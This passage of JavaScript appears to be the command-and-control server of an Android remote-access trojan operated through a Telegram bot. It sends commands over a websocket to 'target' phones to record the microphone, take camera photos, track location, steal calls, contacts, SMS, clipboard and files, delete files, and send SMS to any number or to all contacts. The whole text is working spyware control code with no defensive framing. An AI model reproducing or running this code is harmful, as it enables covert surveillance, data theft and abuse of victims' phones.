                        {text: '\uD83C\uDFA4\u0645\u064A\u0643\u0631\u0648\u0641\u0648\u0646 ', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '\uD83D\uDCF7\u0627\u0644\u0643\u0627\u0645\u064A\u0631\u0627 \u0627\u0644\u0631\u0626\u064A\u0633\u064A\u0629 ', callback_data: `camera_main:${uuid}`},
                        {text: '\uD83D\uDCF8\u0643\u0627\u0645\u064A\u0631\u0627 \u0627\u0644\u0633\u064A\u0644\u0641\u064A ', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '\uD83D\uDEA9\u0627\u0644\u0645\u0648\u0642\u0639', callback_data: `location:${uuid}`},
                        {text: '\u203C\uFE0F\u062D\u0645\u0635 ', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '\uD83D\uDCDE\u0627\u0644\u0645\u0643\u0627\u0644\u0645\u0627\u062A ', callback_data: `calls:${uuid}`},
                        {text: '\uD83D\uDCD2\u062C\u0647\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644 ', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '\uD83D\uDCF3\u064A\u0647\u062A\u0632 ', callback_data: `vibrate:${uuid}`},
                        {text: '\uD83D\uDD14\u0625\u0638\u0647\u0627\u0631 \u0627\u0644\u0625\u0634\u0639\u0627\u0631 ', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '\u2709\uFE0F\u0631\u0633\u0627\u0626\u0644 ', callback_data: `messages:${uuid}`},
                        {text: '\uD83D\uDCE8\u0627\u0631\u0633\u0644 \u0631\u0633\u0627\u0644\u0629 ', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '\uD83D\uDD0A\u062A\u0634\u063A\u064A\u0644 \u0627\u0644\u0635\u0648\u062A ', callback_data: `play_audio:${uuid}`},
                        {text: '\uD83D\uDD07\u0625\u064A\u0642\u0627\u0641 \u0627\u0644\u0635\u0648\u062A ', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '\uD83D\uDCE8\u0625\u0631\u0633\u0627\u0644 \u0631\u0633\u0627\u0644\u0629 \u0625\u0644\u0649 \u062C\u0645\u064A\u0639 \u062C\u0647\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644 ',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629 \n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D21\u026A\u029F\u029F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u1D00 \u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07 \u026A\u0274 \u1D1B\u029C\u1D07 \u0274\u1D07x\u1D1B \uA730\u1D07\u1D21 \u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16"], ["\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '\u00B0\u2022 \u064A\u0631\u062C\u0649 \u0627\u0644\u0631\u062F \u0639\u0644\u0649 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0642\u0635\u064A\u0631\u0629 \u0625\u0644\u064A\u0647 \n\n' +
            '\u2022\u026A\uA730 \u028F\u1D0F\u1D1C \u1D21\u1D00\u0274\u1D1B \u1D1B\u1D0F \uA731\u1D07\u0274\u1D05 \uA731\u1D0D\uA731 \u1D1B\u1D0F \u029F\u1D0F\u1D04\u1D00\u029F \u1D04\u1D0F\u1D1C\u0274\u1D1B\u0280\u028F \u0274\u1D1C\u1D0D\u0299\u1D07\u0280\uA731, \u028F\u1D0F\u1D1C \u1D04\u1D00\u0274 \u1D07\u0274\u1D1B\u1D07\u0280 \u1D1B\u029C\u1D07 \u0274\u1D1C\u1D0D\u0299\u1D07\u0280 \u1D21\u026A\u1D1B\u029C \u1D22\u1D07\u0280\u1D0F \u1D00\u1D1B \u1D1B\u029C\u1D07 \u0299\u1D07\u0262\u026A\u0274\u0274\u026A\u0274\u0262, \u1D0F\u1D1B\u029C\u1D07\u0280\u1D21\u026A\uA731\u1D07 \u1D07\u0274\u1D1B\u1D07\u0280 \u1D1B\u029C\u1D07 \u0274\u1D1C\u1D0D\u0299\u1D07\u0280 \u1D21\u026A\u1D1B\u029C \u1D1B\u029C\u1D07 \u1D04\u1D0F\u1D1C\u0274\u1D1B\u0280\u028F \u1D04\u1D0F\u1D05\u1D07',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u062C\u0645\u064A\u0639 \u062C\u0647\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644\n\n' +
            '\u2022 \u0299\u1D07 \u1D04\u1D00\u0280\u1D07\uA730\u1D1C\u029F \u1D1B\u029C\u1D00\u1D1B \u1D1B\u029C\u1D07 \u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07 \u1D21\u026A\u029F\u029F \u0274\u1D0F\u1D1B \u0299\u1D07 \uA731\u1D07\u0274\u1D1B \u026A\uA730 \u1D1B\u029C\u1D07 \u0274\u1D1C\u1D0D\u0299\u1D07\u0280 \u1D0F\uA730 \u1D04\u029C\u1D00\u0280\u1D00\u1D04\u1D1B\u1D07\u0280\uA731 \u026A\u0274 \u028F\u1D0F\u1D1C\u0280 \u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07 \u026A\uA731 \u1D0D\u1D0F\u0280\u1D07 \u1D1B\u029C\u1D00\u0274 \u1D00\u029F\u029F\u1D0F\u1D21\u1D07\u1D05',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0645\u0633\u0627\u0631 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062A\u0646\u0632\u064A\u0644\u0647 \n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D05\u1D0F \u0274\u1D0F\u1D1B \u0274\u1D07\u1D07\u1D05 \u1D1B\u1D0F \u1D07\u0274\u1D1B\u1D07\u0280 \u1D1B\u029C\u1D07 \uA730\u1D1C\u029F\u029F \uA730\u026A\u029F\u1D07 \u1D18\u1D00\u1D1B\u029C, \u1D0A\u1D1C\uA731\u1D1B \u1D07\u0274\u1D1B\u1D07\u0280 \u1D1B\u029C\u1D07 \u1D0D\u1D00\u026A\u0274 \u1D18\u1D00\u1D1B\u029C. \uA730\u1D0F\u0280 \u1D07x\u1D00\u1D0D\u1D18\u029F\u1D07, \u1D07\u0274\u1D1B\u1D07\u0280<b> DCIM/Camera </b> \u1D1B\u1D0F \u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07 \u0262\u1D00\u029F\u029F\u1D07\u0280\u028F \uA730\u026A\u029F\u1D07\uA731.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0645\u0633\u0627\u0631 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062D\u0630\u0641\u0647 \n\n' +
            '\u2022 \u028F\u1D0F\u1D1C \u1D05\u1D0F \u0274\u1D0F\u1D1B \u0274\u1D07\u1D07\u1D05 \u1D1B\u1D0F \u1D07\u0274\u1D1B\u1D07\u0280 \u1D1B\u029C\u1D07 \uA730\u1D1C\u029F\u029F \uA730\u026A\u029F\u1D07 \u1D18\u1D00\u1D1B\u029C, \u1D0A\u1D1C\uA731\u1D1B \u1D07\u0274\u1D1B\u1D07\u0280 \u1D1B\u029C\u1D07 \u1D0D\u1D00\u026A\u0274 \u1D18\u1D00\u1D1B\u029C. \uA730\u1D0F\u0280 \u1D07x\u1D00\u1D0D\u1D18\u029F\u1D07, \u1D07\u0274\u1D1B\u1D07\u0280<b> DCIM/Camera </b> \u1D1B\u1D0F \u1D05\u1D07\u029F\u1D07\u1D1B\u1D07 \u0262\u1D00\u029F\u029F\u1D07\u0280\u028F \uA730\u026A\u029F\u1D07\uA731.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u0645\u064A\u0643\u0631\u0648\u0641\u0648\u0646 \u0641\u064A\u0647\u0627 \n\n' +
            '\u2022 \u0274\u1D0F\u1D1B\u1D07 \u1D1B\u029C\u1D00\u1D1B \u028F\u1D0F\u1D1C \u1D0D\u1D1C\uA731\u1D1B \u1D07\u0274\u1D1B\u1D07\u0280 \u1D1B\u029C\u1D07 \u1D1B\u026A\u1D0D\u1D07 \u0274\u1D1C\u1D0D\u1D07\u0280\u026A\u1D04\u1D00\u029F\u029F\u028F \u026A\u0274 \u1D1C\u0274\u026A\u1D1B\uA731 \u1D0F\uA730 \uA731\u1D07\u1D04\u1D0F\u0274\u1D05\uA731',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0638\u0647\u0648\u0631\u0647\u0627 \u0639\u0644\u0649 \u0627\u0644\u062C\u0647\u0627\u0632 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641 \n\n' +
            '\u2022 \u1D1B\u1D0F\u1D00\uA731\u1D1B \u026A\uA731 \u1D00 \uA731\u029C\u1D0F\u0280\u1D1B \u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07 \u1D1B\u029C\u1D00\u1D1B \u1D00\u1D18\u1D18\u1D07\u1D00\u0280\uA731 \u1D0F\u0274 \u1D1B\u029C\u1D07 \u1D05\u1D07\u1D20\u026A\u1D04\u1D07 \uA731\u1D04\u0280\u1D07\u1D07\u0274 \uA730\u1D0F\u0280 \u1D00 \uA730\u1D07\u1D21 \uA731\u1D07\u1D04\u1D0F\u0274\u1D05\uA731',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0623\u0646 \u062A\u0638\u0647\u0631 \u0643\u0625\u0634\u0639\u0627\u0631\n\n' +
            '\u2022 \u028F\u1D0F\u1D1C\u0280 \u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07 \u1D21\u026A\u029F\u029F \u0299\u1D07 \u1D00\u1D18\u1D18\u1D07\u1D00\u0280 \u026A\u0274 \u1D1B\u1D00\u0280\u0262\u1D07\u1D1B \u1D05\u1D07\u1D20\u026A\u1D04\u1D07 \uA731\u1D1B\u1D00\u1D1B\u1D1C\uA731 \u0299\u1D00\u0280 \u029F\u026A\u1D0B\u1D07 \u0280\u1D07\u0262\u1D1C\u029F\u1D00\u0280 \u0274\u1D0F\u1D1B\u026A\uA730\u026A\u1D04\u1D00\u1D1B\u026A\u1D0F\u0274',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '\u00B0\u2022 \u0623\u062F\u062E\u0644 \u0631\u0627\u0628\u0637 \u0627\u0644\u0635\u0648\u062A \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062A\u0634\u063A\u064A\u0644\u0647\n\n' +
            '\u2022 \u0274\u1D0F\u1D1B\u1D07 \u1D1B\u029C\u1D00\u1D1B \u028F\u1D0F\u1D1C \u1D0D\u1D1C\uA731\u1D1B \u1D07\u0274\u1D1B\u1D07\u0280 \u1D1B\u029C\u1D07 \u1D05\u026A\u0280\u1D07\u1D04\u1D1B \u029F\u026A\u0274\u1D0B \u1D0F\uA730 \u1D1B\u029C\u1D07 \u1D05\u1D07\uA731\u026A\u0280\u1D07\u1D05 \uA731\u1D0F\u1D1C\u0274\u1D05, \u1D0F\u1D1B\u029C\u1D07\u0280\u1D21\u026A\uA731\u1D07 \u1D1B\u029C\u1D07 \uA731\u1D0F\u1D1C\u0274\u1D05 \u1D21\u026A\u029F\u029F \u0274\u1D0F\u1D1B \u0299\u1D07 \u1D18\u029F\u1D00\u028F\u1D07\u1D05',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);